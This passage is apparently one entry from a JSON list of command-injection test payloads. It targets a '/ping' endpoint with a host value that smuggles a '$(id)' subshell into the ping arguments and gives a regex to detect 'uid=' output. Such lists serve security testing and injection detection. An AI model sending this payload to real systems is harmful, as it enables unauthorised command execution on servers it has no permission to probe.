    "endpoint": "/ping",
    "method": "POST",
    "params": {
      "host": "127.0.0.1 -c 1 -W 1 -p $(id)"
    },
    "detect_pattern": "uid=[0-9]+\\(",
    "technique": "Using -p flag with $() subshell — tests if $ is actually blocked in context"
  },
